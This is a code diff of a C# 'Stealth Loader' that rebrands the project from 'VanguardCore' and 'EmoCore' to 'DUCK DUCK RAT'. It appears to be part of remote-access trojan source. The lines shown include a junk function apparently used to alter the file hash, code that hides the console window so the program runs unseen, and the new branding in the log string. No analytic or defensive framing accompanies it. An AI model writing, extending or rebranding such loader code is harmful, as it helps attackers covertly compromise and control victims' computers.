@@ -9,11 +9,11 @@ using System.Net;
 using System.Security.Cryptography;
 using System.Reflection;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class UltraLoader
     {
-        private static void _vanguard_5648f42f() {
+        private static void _DuckDuckRat_5648f42f() {
             int val = 17876;
             if (val > 50000) Console.WriteLine("Hash:" + 17876);
         }
@@ -53,7 +53,7 @@ namespace VanguardCore
             if (consoleWindow != IntPtr.Zero) ShowWindow(consoleWindow, 0);
 
             Log("========================================");
-            Log(string.Format("EmoCore v1 Stealth Loader starting at {0}", DateTime.Now));
+            Log(string.Format("DUCK DUCK RAT v1 Stealth Loader starting at {0}", DateTime.Now));
 
             // [PRO] Initialize Safety Layer
             try { SafetyManager.Startup(); } catch { }
@@ -136,3 +136,5 @@ namespace VanguardCore
         [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
+
+
